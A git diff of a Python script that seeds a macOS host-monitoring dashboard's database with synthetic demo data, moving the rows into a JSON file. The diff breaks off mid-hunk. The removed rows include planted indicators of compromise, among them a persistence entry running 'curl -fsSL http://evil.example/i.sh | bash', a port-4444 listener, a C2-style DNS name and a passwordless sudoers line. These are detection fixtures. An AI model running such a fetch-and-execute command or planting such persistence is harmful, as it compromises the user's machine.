@@ -1,25 +1,36 @@
 #!/usr/bin/env python3
 """Seed the avai database with realistic synthetic data across ALL tables so
-the dashboard is fully populated for a demo / dev run — no sudo, no real
+the dashboard is fully populated for a demo / dev run: no sudo, no real
 system activity, no actual malware. Pure DB inserts.
 
 Usage:
     python tools/seed_demo_db.py [--db ~/avai-local.db]
 
 Intended for a fresh DB (delete the old one first). Idempotent-ish: it
-creates the schema if missing and inserts a self-contained snapshot.
+creates the schema if missing and inserts a self-contained snapshot. The
+snapshot rows live in ``demo_seed.json`` next to this file; timestamps there
+are tokens (``$run_start:K``, ``$run_end:K``) resolved against "now", and
+``$home:<path>`` resolves under the current user's home.
 """
+
 from __future__ import annotations
 
 import argparse
 import json
 import os
+import sqlite3
+import sys
+from collections.abc import Callable
+from contextlib import closing
+from dataclasses import dataclass
 from datetime import datetime, timedelta, timezone
+from pathlib import Path
+from typing import TextIO
 
-from sqlalchemy import create_engine, insert
-from sqlalchemy.orm import Session
+from sqlalchemy import Engine, create_engine, insert
+from sqlalchemy.orm import DeclarativeBase, Session
 
-from avai.enrichers.cache import register_schema
+from avai.enrichers.cache import EnrichmentSchema
 from avai.host_monitor import (
     AuthEventRow,
     Base,
@@ -59,1222 +70,452 @@ from avai.host_monitor import (
     YaraStatusRow,
 )
 
-
-def _iso(dt: datetime) -> str:
-    return dt.replace(microsecond=0).isoformat()
-
-
-_BULK_NAMES = [
-    "Google Chrome",
-    "node",
-    "python3.11",
-    "Slack",
-    "zoom.us",
-    "Terminal",
-    "ssh",
-    "curl",
-    "bash",
-    "mDNSResponder",
-    "WindowServer",
-    "cfprefsd",
-]
+SEED_FILE = Path(__file__).with_name("demo_seed.json")
+DEFAULT_DB = "~/avai-local.db"
+BYTES_PER_MB = 1024 * 1024
+DEMO_HOST = "demo-host.local"
+DEMO_USER = "iklo"
+DEMO_REMOTE_NET = "203.0.113"
+SUMMARY_TABLES = (
+    "collection_runs",
+    "judgements",
+    "incident_narratives",
+    "risk_scores",
+    "enrichment_evidence",
+)
 
 
-def _db_size_bytes(path: str) -> int:
-    total = 0
-    for suffix in ("", "-wal", "-shm"):
-        p = path + suffix
-        if os.path.exists(p):
-            total += os.path.getsize(p)
-    return total
+class DemoClock:
+    """Run k (1 = newest) started ``k * RUN_SPACING`` before now."""
+
+    RUN_SPACING = timedelta(minutes=4)
+    RUN_DURATION = timedelta(seconds=28)
+
+    def __init__(self, now: datetime) -> None:
+        self._now = now
+
+    def now(self) -> datetime:
+        return self._now
+
+    def iso(self, moment: datetime) -> str:
+        return moment.replace(microsecond=0).isoformat()
+
+    def run_start(self, run: int) -> str:
+        return self.iso(self._start(run))
+
+    def run_end(self, run: int) -> str:
+        return self.iso(self._start(run) + self.RUN_DURATION)
+
+    def _start(self, run: int) -> datetime:
+        return self._now - self.RUN_SPACING * run
 
 
-def bulk_fill(engine, db_path: str, target_bytes: int, base_time: datetime) -> int:
-    """Insert historical rows across the heavy time-series tables until the DB
-    reaches ``target_bytes``. The runs are older than the demo snapshot so the
-    'latest run' panels stay clean — this only adds history + volume."""
-    hist = []
-    with Session(engine) as s:
-        for i in range(240):
-            st = base_time - timedelta(hours=3) + timedelta(seconds=i * 30)
-            rid = f"hist-{i}"
-            s.add(
-                CollectionRun(
-                    run_id=rid,
-                    started_at=_iso(st),
-                    finished_at=_iso(st + timedelta(seconds=18)),
-                    hostname="demo-host.local",
-                    collectors_ok=24,
-                    collectors_failed=0,
-                    lookback_min=6,
-                )
-            )
-            hist.append((rid, _iso(st)))
-        s.commit()
+class SeedTokens:
+    """Replaces ``$name:arg`` strings anywhere in a JSON value."""
 
-    batch = 10000
-    it = 0
-    while _db_size_bytes(db_path) < target_bytes:
-        rid, ts = hist[it % len(hist)]
-        procs, auth, conns, dns, execs = [], [], [], [], []
-        for j in range(batch):
-            nm = _BULK_NAMES[j % len(_BULK_NAMES)]
-            procs.append(
-                {
-                    "run_id": rid,
-                    "collected_at": ts,
-                    "content_hash": f"hp{it}_{j}",
-                    "pid": 1000 + j,
-                    "ppid": 1,
-                    "name": nm,
-                    "exe": f"/usr/bin/{nm}",
-                    "cmdline_json": json.dumps([nm, "--opt", str(j)]),
-                    "username": "iklo",
-                    "cpu_percent": (j % 97) / 3.0,
-                    "memory_rss": 5_000_000 + j * 13,
-                    "num_threads": 1 + j % 24,
-                }
-            )
-            auth.append(
-                {
-                    "run_id": rid,
-                    "collected_at": ts,
-                    "content_hash": f"ha{it}_{j}",
-                    "event_timestamp": ts,
-                    "process": "sshd" if j % 2 else "sudo",
-                    "subsystem": "com.apple.securityd",
-                    "category": "auth",
-                    "event_type": "failure",
-                    "event_message": (
-                        f"authentication failure {it}_{j} for demo "
-                        f"from 203.0.113.{j % 256}"
-                    ),
-                    "pid": 900 + j % 500,
-                    "raw_json": json.dumps({"seq": j, "blob": "x" * 48}),
-                }
-            )
-            conns.append(
-                {
-                    "run_id": rid,
-                    "collected_at": ts,
-                    "content_hash": f"hc{it}_{j}",
-                    "pid": 1000 + j,
-                    "family": "AF_INET",
-                    "type": "SOCK_STREAM",
-                    "laddr_ip": "192.168.1.20",
-                    "laddr_port": 40000 + j % 20000,
-                    "raddr_ip": f"203.0.113.{j % 256}",
-                    "raddr_port": 443,
-                    "status": "ESTABLISHED",
-                }
-            )
-            dns.append(
-                {
-                    "run_id": rid,
-                    "collected_at": ts,
-                    "content_hash": f"hd{it}_{j}",
-                    "iface": "en0",
-                    "qname": f"host{j}.cdn.example.com",
-                    "qtype": "A",
-                    "server_ip": "192.168.1.1",
-                    "process": nm,
-                    "count": 1 + j % 9,
-                    "first_seen": ts,
-                    "last_seen": ts,
-                }
-            )
-            execs.append(
-                {
-                    "run_id": rid,
-                    "collected_at": ts,
-                    "content_hash": f"hx{it}_{j}",
-                    "event_timestamp": ts,
-                    "event_type": "exec",
-                    "pid": 2000 + j,
-                    "ppid": 1,
-                    "uid": 501,
-                    "username": "iklo",
-                    "exe_path": f"/usr/bin/{nm}",
-                    "exe_args_json": json.dumps([nm, str(j)]),
-                    "parent_path": "/bin/zsh",
-                    "signing_id": "com.apple.x",
-                }
-            )
-        with engine.begin() as conn:
-            conn.execute(insert(ProcessRow), procs)
-            conn.execute(insert(AuthEventRow), auth)
-            conn.execute(insert(NetworkConnectionRow), conns)
-            conn.execute(insert(DnsQueryRow), dns)
-            conn.execute(insert(ProcessExecRow), execs)
-        it += 1
-    return _db_size_bytes(db_path)
+    def __init__(self, clock: DemoClock, home: Path) -> None:
+        self._clock = clock
+        self._home = home
+
+    def resolve(self, value: object) -> object:
+        match value:
+            case str():
+                return self._text(value)
+            case list():
+                return [self.resolve(item) for item in value]
+            case dict():
+                return {key: self.resolve(item) for key, item in value.items()}
+            case _:
+                return value
+
+    def _text(self, text: str) -> str:
+        if not text.startswith("$"):
+            return text
+        name, _, argument = text[1:].partition(":")
+        handlers = {
+            "home": self._home_path,
+            "run_start": self._run_start,
+            "run_end": self._run_end,
+        }
+        return handlers[name](argument)
+
+    def _home_path(self, relative: str) -> str:
+        return str(self._home / relative)
+
+    def _run_start(self, run: str) -> str:
+        return self._clock.run_start(int(run))
+
+    def _run_end(self, run: str) -> str:
+        return self._clock.run_end(int(run))
 
 
-def main() -> None:
-    ap = argparse.ArgumentParser(description="Seed avai DB with demo data.")
-    ap.add_argument("--db", default=os.path.expanduser("~/avai-local.db"))
-    ap.add_argument(
-        "--target-mb",
-        type=float,
-        default=0.0,
-        help="If >0, bulk-fill historical rows until the DB is at least this "
-        "many MB (the demo snapshot stays the latest run).",
-    )
-    args = ap.parse_args()
+class DemoModels:
+    """The ORM classes ``demo_seed.json`` names, by class name."""
 
-    engine = create_engine(
-        f"sqlite:///{args.db}", connect_args={"check_same_thread": False}
-    )
-    sink = Sink(engine)
-    sink.setup()  # create_all + register enrichment model + migrate
-    EVID = register_schema(Base)
-
-    now = datetime.now(timezone.utc).replace(microsecond=0)
-    HOST = "demo-host.local"
-
-    # ---- 6 completed runs (oldest→newest) for the risk sparkline ----
-    runs = []  # (run_id, started_iso)
-    for k in range(6, 0, -1):
-        st = now - timedelta(minutes=4 * k)
-        runs.append((f"run-{k}", _iso(st), _iso(st + timedelta(seconds=28))))
-    LATEST_RID, LATEST, LATEST_FIN = runs[-1]
-
-    rows: list = []
-
-    for rid, st, fin in runs:
-        rows.append(
-            CollectionRun(
-                run_id=rid,
-                started_at=st,
-                finished_at=fin,
-                hostname=HOST,
-                collectors_ok=24,
-                collectors_failed=1,
-                lookback_min=6,
-            )
-        )
-
-    def cr(model, ch=None, **f):
-        """Collector row tied to the latest run."""
-        rows.append(model(run_id=LATEST_RID, collected_at=LATEST, content_hash=ch, **f))
-
-    # ---- processes ----
-    cr(
-        ProcessRow,
-        ch="p_chrome",
-        pid=501,
-        ppid=1,
-        name="Google Chrome",
-        exe="/Applications/Google Chrome.app/Contents/MacOS/Google Chrome",
-        username="iklo",
-        cpu_percent=3.4,
-        memory_rss=820_000_000,
-        num_threads=42,
-    )
-    cr(
-        ProcessRow,
-        ch="p_evil",
-        pid=66610,
-        ppid=931,
-        name="x",
-        exe="/tmp/.x",
-        cmdline_json=json.dumps(["/tmp/.x", "-d"]),
-        username="iklo",
-        cpu_percent=22.1,
-        memory_rss=4_000_000,
-        num_threads=3,
-    )
-    cr(
-        ProcessRow,
-        ch="p_ssh",
-        pid=720,
-        ppid=1,
-        name="sshd",
-        exe="/usr/sbin/sshd",
-        username="root",
-        cpu_percent=0.0,
-        memory_rss=6_000_000,
-    )
-    cr(ProcessRow, pid=1, ppid=0, name="launchd", exe="/sbin/launchd", username="root")
-
-    # ---- network_connections ----
-    cr(
-        NetworkConnectionRow,
-        pid=501,
-        family="AF_INET",
-        type="SOCK_STREAM",
-        laddr_ip="192.168.1.20",
-        laddr_port=51020,
-        raddr_ip="142.250.80.46",
-        raddr_port=443,
-        status="ESTABLISHED",
-    )
-    cr(
-        NetworkConnectionRow,
-        ch="nc_evil",
-        pid=66610,
-        family="AF_INET",
-        type="SOCK_STREAM",
-        laddr_ip="192.168.1.20",
-        laddr_port=51999,
-        raddr_ip="9.9.9.9",
-        raddr_port=443,
-        status="ESTABLISHED",
-    )
-
-    # ---- listening_ports ----
-    cr(
-        ListeningPortRow,
-        ch="lp_evil",
-        pid=66610,
-        process_name="x",
-        family="AF_INET",
-        type="SOCK_STREAM",
-        laddr_ip="0.0.0.0",
-        laddr_port=4444,
-    )
-    cr(
-        ListeningPortRow,
-        pid=720,
-        process_name="sshd",
-        family="AF_INET",
-        type="SOCK_STREAM",
-        laddr_ip="0.0.0.0",
-        laddr_port=22,
-    )
-
-    # ---- network_flows ----
-    cr(
-        NetworkFlowRow,
-        ch="nf_evil",
-        iface="en0",
-        proto="tcp",
-        dst_ip="9.9.9.9",
-        dst_port=443,
-        service="https",
-        packets=120,
-        byte_count=18000,
-        process="x",
-        pid=66610,
-        first_seen=LATEST,
-        last_seen=LATEST,
-    )
-    cr(
-        NetworkFlowRow,
-        iface="en0",
-        proto="tcp",
-        dst_ip="142.250.80.46",
-        dst_port=443,
-        service="https",
-        packets=8400,
-        byte_count=9_200_000,
-        process="Google Chrome",
-        pid=501,
-        first_seen=LATEST,
-        last_seen=LATEST,
-    )
-
-    # ---- dns_queries ----
-    cr(
-        DnsQueryRow,
-        ch="dns_evil",
-        iface="en0",
-        qname="c2-sync.example",
-        qtype="A",
-        server_ip="192.168.1.1",
-        process="x",
-        count=37,
-        first_seen=LATEST,
-        last_seen=LATEST,
-    )
-    cr(
-        DnsQueryRow,
-        iface="en0",
-        qname="www.google.com",
-        qtype="A",
-        server_ip="192.168.1.1",
-        process="Google Chrome",
-        count=12,
-        first_seen=LATEST,
-        last_seen=LATEST,
-    )
-
-    # ---- network_interfaces ----
-    cr(
-        NetworkInterfaceRow,
-        name="en0",
-        is_up=True,
-        speed_mbps=1000,
-        mtu=1500,
-        bytes_sent=8_300_000_000,
-        bytes_recv=42_000_000_000,
-        packets_sent=21_000_000,
-        packets_recv=33_000_000,
-        addresses_json=json.dumps(["192.168.1.20", "fe80::1"]),
-    )
-    cr(
-        NetworkInterfaceRow,
-        name="lo0",
-        is_up=True,
-        mtu=16384,
-        addresses_json=json.dumps(["127.0.0.1", "::1"]),
-    )
-
-    # ---- usb_devices ----
-    cr(
-        UsbDeviceRow,
-        name="USB Keyboard",
-        vendor_id="05ac",
-        product_id="024f",
-        manufacturer="Apple Inc.",
-        speed="Low Speed",
-    )
-    cr(
-        UsbDeviceRow,
-        ch="usb_susp",
-        name="USB Mass Storage",
-        vendor_id="0781",
-        product_id="5567",
-        manufacturer="SanDisk",
-        serial_number="4C530001",
-        speed="High Speed",
-    )
-
-    # ---- bluetooth_devices ----
-    cr(
+    MODELS = (
+        AuthEventRow,
         BluetoothDeviceRow,
-        name="Magic Mouse",
-        address="a4:83:e7:11:22:33",
-        connected=True,
-        paired=True,
-        minor_type="Mouse",
-    )
-    cr(
-        BluetoothDeviceRow,
-        ch="bt_susp",
-        name="rafaela frare",
-        address="00:1a:7d:da:71:13",
-        connected=False,
-        paired=True,
-        minor_type="Keyboard",
-    )
-
-    # ---- wifi_state ----
-    cr(
-        WifiStateRow,
-        interface="en0",
-        ssid="HomeNet",
-        bssid="b4:fb:e4:aa:bb:cc",
-        channel=44,
-        security="WPA2 Personal",
-    )
-
-    # ---- launch_items ----
-    cr(
-        LaunchItemRow,
-        ch="li_evil",
-        scope="user_agent",
-        path=os.path.expanduser("~/Library/LaunchAgents/com.evil.persist.plist"),
-        label="com.evil.persist",
-        program="/bin/bash",
-        program_arguments_json=json.dumps(
-            ["/bin/bash", "-c", "curl -fsSL http://evil.example/i.sh | bash"]
-        ),
-        run_at_load=True,
-        keep_alive=True,
-        user_name="iklo",
-    )
-    cr(
-        LaunchItemRow,
-        scope="system_daemon",
-        path="/Library/LaunchDaemons/com.apple.x.plist",
-        label="com.apple.x",
-        program="/usr/libexec/x",
-        run_at_load=True,
-    )
-
-    # ---- quarantine_events ----
-    cr(
-        QuarantineEventRow,
-        ch="q_susp",
-        event_id="A1B2",
-        timestamp=1717000000.0,
-        agent_bundle_id="com.apple.Safari",
-        agent_name="Safari",
-        origin_url="http://free-downloads.example/installer.dmg",
-        data_url="http://cdn.example/installer.dmg",
-        type_number=0,
-    )
-
-    # ---- browser_extensions ----
-    cr(
         BrowserExtensionRow,
-        ch="be_susp",
-        browser="chrome",
-        profile="Default",
-        extension_id="aaaabbbbccccddddeeeeffff",
-        name="Coupon Saver",
-        version="3.1",
-        permissions_json=json.dumps(["tabs", "webRequest", "cookies", "<all_urls>"]),
-        host_permissions_json=json.dumps(["<all_urls>"]),
-    )
-    cr(
-        BrowserExtensionRow,
-        browser="chrome",
-        profile="Default",
-        extension_id="cjpalhdlnbpafiamejdnhcphjbkeiagm",
-        name="uBlock Origin",
-        version="1.57",
-        permissions_json=json.dumps(["storage"]),
-    )
-
-    # ---- system_integrity (firewall OFF + SSH ON → drives risk drivers) ----
-    cr(
-        SystemIntegrityRow,
-        filevault_active=True,
-        firewall_global_state=0,
-        firewall_stealth=False,
-        gatekeeper_assessments_enabled=True,
-        remote_login_enabled=True,
-        screen_sharing_enabled=False,
-        remote_management_enabled=False,
-    )
-
-    # ---- file_integrity ----
-    cr(
+        CollectionRun,
+        DiskUsageRow,
+        DnsQueryRow,
         FileIntegrityRow,
-        ch="fi_susp",
-        path=os.path.expanduser("~/.zshrc"),
-        sha256="a" * 64,
-        size=4200,
-        mode=0o644,
-        uid=501,
-        gid=20,
-        exists_flag=1,
-    )
-    cr(
-        FileIntegrityRow,
-        path="/etc/ssh/sshd_config",
-        sha256="b" * 64,
-        size=3200,
-        mode=0o644,
-        uid=0,
-        gid=0,
-        exists_flag=1,
-    )
-
-    # ---- installed_apps ----
-    cr(
-        InstalledAppRow,
-        path="/Applications/Google Chrome.app",
-        bundle_id="com.google.Chrome",
-        name="Google Chrome",
-        version="120.0.6099",
-    )
-    cr(
-        InstalledAppRow,
-        path="/usr/bin/openssl",
-        bundle_id="org.openssl",
-        name="openssl",
-        version="3.0.2",
-    )
-    cr(InstalledAppRow, path="/usr/bin/curl", name="libcurl", version="7.88.0")
-
-    # ---- process_exec_events ----
-    cr(
-        ProcessExecRow,
-        ch="px_evil",
-        event_timestamp=LATEST,
-        event_type="exec",
-        pid=66610,
-        ppid=931,
-        uid=501,
-        username="iklo",
-        exe_path="/tmp/.x",
-        exe_args_json=json.dumps(["/tmp/.x", "-d"]),
-        parent_path="/bin/zsh",
-        signing_id=None,
-    )
-    cr(
-        ProcessExecRow,
-        event_timestamp=LATEST,
-        event_type="exec",
-        pid=940,
-        ppid=1,
-        uid=0,
-        username="root",
-        exe_path="/usr/sbin/cron",
-        parent_path="/sbin/launchd",
-        signing_id="com.apple.cron",
-    )
-
-    # ---- mounts ----
-    cr(
-        MountRow,
-        device="/dev/disk3s1s1",
-        mountpoint="/",
-        fstype="apfs",
-        opts="ro,journaled",
-    )
-    cr(
-        MountRow,
-        device="/dev/disk3s5",
-        mountpoint="/System/Volumes/Data",
-        fstype="apfs",
-        opts="rw,journaled",
-    )
-
-    # ---- setuid_files ----
-    cr(
-        SetuidFileRow,
-        path="/usr/bin/sudo",
-        mode=0o4555,
-        uid=0,
-        gid=0,
-        size=1_400_000,
-        setuid=True,
-        setgid=False,
-        sha256="c" * 64,
-    )
-    cr(
-        SetuidFileRow,
-        ch="su_susp",
-        path="/usr/local/bin/helper",
-        mode=0o4755,
-        uid=0,
-        gid=0,
-        size=22000,
-        setuid=True,
-        setgid=False,
-        sha256="d" * 64,
-    )
-
-    # ---- mdm_profiles ----
-    cr(
-        MdmProfileRow,
-        identifier="com.example.mdm",
-        display_name="Corp MDM",
-        organization="Example Corp",
-        profile_scope="System",
-        is_supervised=True,
-    )
-
-    # ---- kernel_extensions ----
-    cr(
-        KernelExtensionRow,
-        bundle_id="com.apple.iokit.IOHIDFamily",
-        name="IOHIDFamily",
-        version="2.0.0",
-        path="/System/Library/Extensions",
-        team_id=None,
-        signing_id="com.apple.iokit.IOHIDFamily",
-    )
-
-    # ---- system_extensions ----
-    cr(
-        SystemExtensionRow,
-        bundle_id="com.cloudflare.warp.extension",
-        team_id="68WVV388M8",
-        version="2024.1",
-        state="activated_enabled",
-        categories="network-extension",
-    )
-
-    # ---- ssh_authorized_keys ----
-    cr(
-        SshAuthorizedKeyRow,
-        ch="ssh_susp",
-        path=os.path.expanduser("~/.ssh/authorized_keys"),
-        owner="iklo",
-        key_type="ssh-ed25519",
-        fingerprint="SHA256:Zk3...",
-        comment="root@kali",
-    )
-
-    # ---- hosts_file ----
-    cr(
+        FileScanRow,
+        HostResourceRow,
         HostsFileRow,
-        ch="hosts_susp",
-        source_path="/etc/hosts",
-        ip="127.0.0.1",
-        hostnames="login.bank-of-example.com",
-    )
-    cr(HostsFileRow, source_path="/etc/hosts", ip="127.0.0.1", hostnames="localhost")
-
-    # ---- privilege_config ----
-    cr(
+        IncidentNarrativeRow,
+        InstalledAppRow,
+        Judgement,
+        KernelExtensionRow,
+        LaunchItemRow,
+        ListeningPortRow,
+        MdmProfileRow,
+        MountRow,
+        NetworkConnectionRow,
+        NetworkFlowRow,
+        NetworkInterfaceRow,
         PrivilegeConfigRow,
-        ch="priv_susp",
-        kind="sudoers",
-        subject="iklo",
-        detail="iklo ALL=(ALL) NOPASSWD: ALL",
-        source_path="/etc/sudoers.d/iklo",
-    )
-    cr(
-        PrivilegeConfigRow,
-        kind="account",
-        subject="root",
-        detail="uid=0",
-        source_path="/etc/passwd",
+        ProcessExecRow,
+        ProcessRow,
+        QuarantineEventRow,
+        RiskScoreRow,
+        SetuidFileRow,
+        SshAuthorizedKeyRow,
+        StreamingSession,
+        SystemExtensionRow,
+        SystemIntegrityRow,
+        UsbDeviceRow,
+        WifiStateRow,
+        YaraStatusRow,
     )
 
-    # ---- host_resources (System Resources tiles + trend; one row per run) ----
-    GiB = 1024**3
-    for i, (rid, st, _fin) in enumerate(runs):
-        cpu = [60, 64, 70, 66, 72, 68][i % 6]
-        per_core = [min(99, 40 + ((c * 17 + i * 11) % 55)) for c in range(16)]
-        rows.append(
-            HostResourceRow(
-                run_id=rid,
-                collected_at=st,
-                mem_total=64 * GiB,
-                mem_used=int(64 * GiB * 0.50),
-                mem_available=int(64 * GiB * 0.50),
-                mem_free=int(64 * GiB * 0.20),
-                mem_percent=50.0,
-                swap_total=2 * GiB,
-                swap_used=int(2 * GiB * 0.47),
-                swap_free=int(2 * GiB * 0.53),
-                swap_percent=47.0,
-                cpu_percent=float(cpu),
-                cpu_count_logical=16,
-                cpu_count_physical=8,
-                cpu_per_core_json=json.dumps(per_core),
-                load_1=4.66,
-                load_5=5.66,
-                load_15=5.27,
-                uptime_seconds=1_400_000,
-                tasks_total=789,
-                tasks_running=4,
-                threads_total=3881,
-            )
+    def __init__(self, base: type[DeclarativeBase]) -> None:
+        self._base = base
+
+    def by_name(self) -> dict[str, type[DeclarativeBase]]:
+        models = (*self.MODELS, EnrichmentSchema(self._base).model())
+        return {model.__name__: model for model in models}
+
+
+class DemoSnapshot:
+    """Builds the ORM rows listed in the seed file, in file order (row ids
+    follow that order)."""
+
+    def __init__(self, models: DemoModels, tokens: SeedTokens) -> None:
+        self._models = models
+        self._tokens = tokens
+
+    def rows(self, seed_file: Path) -> list[DeclarativeBase]:
+        entries = json.loads(seed_file.read_text())["rows"]
+        models = self._models.by_name()
+        return [
+            models[entry["model"]](**self._fields(entry["fields"])) for entry in entries
+        ]
+
+    def _fields(self, fields: dict[str, object]) -> dict[str, object]:
+        resolved = self._tokens.resolve(fields)
+        return {key: self._column(value) for key, value in resolved.items()}
+
+    def _column(self, value: object) -> object:
+        """Lists and objects are stored as JSON text columns."""
+        if isinstance(value, (list, dict)):
+            return json.dumps(value)
+        return value
+
+
+class DatabaseFile:
+    SIDE_FILES = ("", "-wal", "-shm")
+
+    def __init__(self, path: str) -> None:
+        self._path = path
+
+    def size_bytes(self) -> int:
+        paths = (Path(self._path + suffix) for suffix in self.SIDE_FILES)
+        return sum(path.stat().st_size for path in paths if path.exists())
+
+    def size_mb(self) -> float:
+        return self.size_bytes() / BYTES_PER_MB
+
+
+@dataclass(frozen=True)
+class BulkRun:
+    run_id: str
+    started_at: str
+
+
+class BulkHistory:
+    """Collection runs older than the demo snapshot, so the 'latest run'
+    panels stay clean: bulk rows only add history and volume."""
+
+    RUNS = 240
+    START_OFFSET = timedelta(hours=3)
+    RUN_STEP = timedelta(seconds=30)
+    RUN_DURATION = timedelta(seconds=18)
+    COLLECTORS_OK = 24
+    LOOKBACK_MIN = 6
+
+    def __init__(self, engine: Engine, clock: DemoClock) -> None:
+        self._engine = engine
+        self._clock = clock
+
+    def write(self) -> list[BulkRun]:
+        first = self._clock.now() - self.START_OFFSET
+        runs = [
+            self._run(index, first + self.RUN_STEP * index)
+            for index in range(self.RUNS)
+        ]
+        with Session(self._engine) as session:
+            session.add_all(runs)
+            session.commit()
+            return [BulkRun(run.run_id, run.started_at) for run in runs]
+
+    def _run(self, index: int, started: datetime) -> CollectionRun:
+        return CollectionRun(
+            run_id=f"hist-{index}",
+            started_at=self._clock.iso(started),
+            finished_at=self._clock.iso(started + self.RUN_DURATION),
+            hostname=DEMO_HOST,
+            collectors_ok=self.COLLECTORS_OK,
+            collectors_failed=0,
+            lookback_min=self.LOOKBACK_MIN,
         )
 
-    # ---- disk_usage (df table on the latest run) ----
-    cr(
-        DiskUsageRow,
-        device="/dev/disk3s1s1",
-        mountpoint="/",
-        fstype="apfs",
-        total=994 * GiB,
-        used=int(994 * GiB * 0.38),
-        free=int(994 * GiB * 0.62),
-        percent=38.0,
-    )
-    cr(
-        DiskUsageRow,
-        ch="disk_data",
-        device="/dev/disk3s5",
-        mountpoint="/System/Volumes/Data",
-        fstype="apfs",
-        total=994 * GiB,
-        used=int(994 * GiB * 0.57),
-        free=int(994 * GiB * 0.43),
-        percent=57.0,
-    )
-    cr(
-        DiskUsageRow,
-        ch="disk_backup",
-        device="/dev/disk4s1",
-        mountpoint="/Volumes/Backup",
-        fstype="hfs",
-        total=500 * GiB,
-        used=int(500 * GiB * 0.97),
-        free=int(500 * GiB * 0.03),
-        percent=97.0,
-    )
 
-    # ---- yara_status (File Scan ruleset summary, single row id=1) ----
-    rows.append(
-        YaraStatusRow(
-            id=1,
-            compiled_at=LATEST,
-            rules_loaded=5292,
-            files_loaded=656,
-            files_skipped=95,
-            rules_dir="/opt/avai/yara",
-            sources_json=json.dumps({"bundled": 1, "signature-base": 655}),
-            skip_reasons_json=json.dumps(
-                {"needs crypto-enabled yara": 82, "other": 13}
+class BulkStamp:
+    """Where one bulk row sits: its run, its batch and its index."""
+
+    PROCESS_NAMES = (
+        "Google Chrome",
+        "node",
+        "python3.11",
+        "Slack",
+        "zoom.us",
+        "Terminal",
+        "ssh",
+        "curl",
+        "bash",
+        "mDNSResponder",
+        "WindowServer",
+        "cfprefsd",
+    )
+    IPV4_OCTETS = 256
+
+    def __init__(self, run: BulkRun, batch: int, index: int) -> None:
+        self.run = run
+        self.batch = batch
+        self.index = index
+
+    def process_name(self) -> str:
+        return self.PROCESS_NAMES[self.index % len(self.PROCESS_NAMES)]
+
+    def remote_ip(self) -> str:
+        return f"{DEMO_REMOTE_NET}.{self.index % self.IPV4_OCTETS}"
+
+    def common(self, hash_prefix: str) -> dict[str, object]:
+        return {
+            "run_id": self.run.run_id,
+            "collected_at": self.run.started_at,
+            "content_hash": f"{hash_prefix}{self.batch}_{self.index}",
+        }
+
+
+class BulkProcessRows:
+    """Bulk ``processes`` and ``process_exec_events`` rows."""
+
+    PID_BASE = 1000
+    EXEC_PID_BASE = 2000
+    CPU_SPREAD = 97
+    CPU_DIVISOR = 3.0
+    RSS_BASE = 5_000_000
+    RSS_STEP = 13
+    THREAD_SPREAD = 24
+    DEMO_UID = 501
+
+    def process(self, stamp: BulkStamp) -> dict[str, object]:
+        name = stamp.process_name()
+        return stamp.common("hp") | {
+            "pid": self.PID_BASE + stamp.index,
+            "ppid": 1,
+            "name": name,
+            "exe": f"/usr/bin/{name}",
+            "cmdline_json": json.dumps([name, "--opt", str(stamp.index)]),
+            "username": DEMO_USER,
+            "cpu_percent": (stamp.index % self.CPU_SPREAD) / self.CPU_DIVISOR,
+            "memory_rss": self.RSS_BASE + stamp.index * self.RSS_STEP,
+            "num_threads": 1 + stamp.index % self.THREAD_SPREAD,
+        }
+
+    def process_exec(self, stamp: BulkStamp) -> dict[str, object]:
+        name = stamp.process_name()
+        return stamp.common("hx") | {
+            "event_timestamp": stamp.run.started_at,
+            "event_type": "exec",
+            "pid": self.EXEC_PID_BASE + stamp.index,
+            "ppid": 1,
+            "uid": self.DEMO_UID,
+            "username": DEMO_USER,
+            "exe_path": f"/usr/bin/{name}",
+            "exe_args_json": json.dumps([name, str(stamp.index)]),
+            "parent_path": "/bin/zsh",
+            "signing_id": "com.apple.x",
+        }
+
+
+class BulkNetworkRows:
+    """Bulk ``network_connections``, ``dns_queries`` and ``auth_events``."""
+
+    PID_BASE = 1000
+    LOCAL_PORT_BASE = 40000
+    LOCAL_PORT_SPREAD = 20000
+    HTTPS_PORT = 443
+    DNS_COUNT_SPREAD = 9
+    AUTH_PID_BASE = 900
+    AUTH_PID_SPREAD = 500
+    RAW_BLOB_LENGTH = 48
+    AUTH_PROCESSES = ("sudo", "sshd")
+
+    def connection(self, stamp: BulkStamp) -> dict[str, object]:
+        return stamp.common("hc") | {
+            "pid": self.PID_BASE + stamp.index,
+            "family": "AF_INET",
+            "type": "SOCK_STREAM",
+            "laddr_ip": "192.168.1.20",
+            "laddr_port": self.LOCAL_PORT_BASE + stamp.index % self.LOCAL_PORT_SPREAD,
+            "raddr_ip": stamp.remote_ip(),
+            "raddr_port": self.HTTPS_PORT,
+            "status": "ESTABLISHED",
+        }
+
+    def dns_query(self, stamp: BulkStamp) -> dict[str, object]:
+        return stamp.common("hd") | {
+            "iface": "en0",
+            "qname": f"host{stamp.index}.cdn.example.com",
+            "qtype": "A",
+            "server_ip": "192.168.1.1",
+            "process": stamp.process_name(),
+            "count": 1 + stamp.index % self.DNS_COUNT_SPREAD,
+            "first_seen": stamp.run.started_at,
+            "last_seen": stamp.run.started_at,
+        }
+
+    def auth_event(self, stamp: BulkStamp) -> dict[str, object]:
+        seq = f"{stamp.batch}_{stamp.index}"
+        return stamp.common("ha") | {
+            "event_timestamp": stamp.run.started_at,
+            "process": self.AUTH_PROCESSES[stamp.index % len(self.AUTH_PROCESSES)],
+            "subsystem": "com.apple.securityd",
+            "category": "auth",
+            "event_type": "failure",
+            "event_message": (
+                f"authentication failure {seq} for demo from {stamp.remote_ip()}"
             ),
-            by_category_json=json.dumps(
-                {
-                    "apt": 260,
-                    "gen": 156,
-                    "crime": 76,
-                    "mal": 46,
-                    "exploit": 31,
-                    "vuln": 22,
-                    "hacktool": 10,
-                    "suspicious": 8,
-                    "webshell": 7,
-                    "ransomware": 6,
-                    "generic": 4,
-                    "cn": 3,
-                }
+            "pid": self.AUTH_PID_BASE + stamp.index % self.AUTH_PID_SPREAD,
+            "raw_json": json.dumps(
+                {"seq": stamp.index, "blob": "x" * self.RAW_BLOB_LENGTH}
             ),
-        )
-    )
+        }
 
-    # ---- file_scan (YARA matches on the latest run) ----
-    cr(
-        FileScanRow,
-        ch="fs_eicar",
-        path=os.path.expanduser("~/Downloads/eicar.com"),
-        rule="eicar_test_file",
-        namespace="bundled",
-        scan_source="user_dirs",
-        sha256="e" * 64,
-        size=68,
-        meta_json=json.dumps(
-            {"author": "avai", "description": "EICAR antivirus test string"}
-        ),
-    )
-    cr(
-        FileScanRow,
-        ch="fs_hacktool",
-        path="/usr/local/bin/masscan",
